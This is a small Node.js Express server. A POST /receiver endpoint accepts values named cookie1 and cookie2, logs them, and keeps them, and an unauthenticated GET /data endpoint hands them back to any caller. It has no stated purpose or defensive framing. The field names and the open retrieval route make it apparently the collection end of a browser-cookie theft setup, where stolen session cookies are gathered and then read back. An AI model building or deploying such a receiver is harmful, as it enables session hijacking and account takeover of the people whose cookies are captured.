const express = require("express");
const app = express();

app.use(express.json());
app.use(express.static("public"));

let lastData = {
    cookie1: "",
    cookie2: ""
};

app.post("/receiver", (req, res) => {
    console.log("=== DATA RECEIVED ===");
    console.log(req.body);

    lastData.cookie1 = req.body.cookie1 || "";
    lastData.cookie2 = req.body.cookie2 || "";

    res.json({
        status: "ok"
    });
});

app.get("/data", (req, res) => {
    res.json(lastData);
});

app.get("/", (req, res) => {
    res.send("Receiver is running");
});

app.listen(process.env.PORT || 3000, () => {
    console.log("Receiver listening");
});
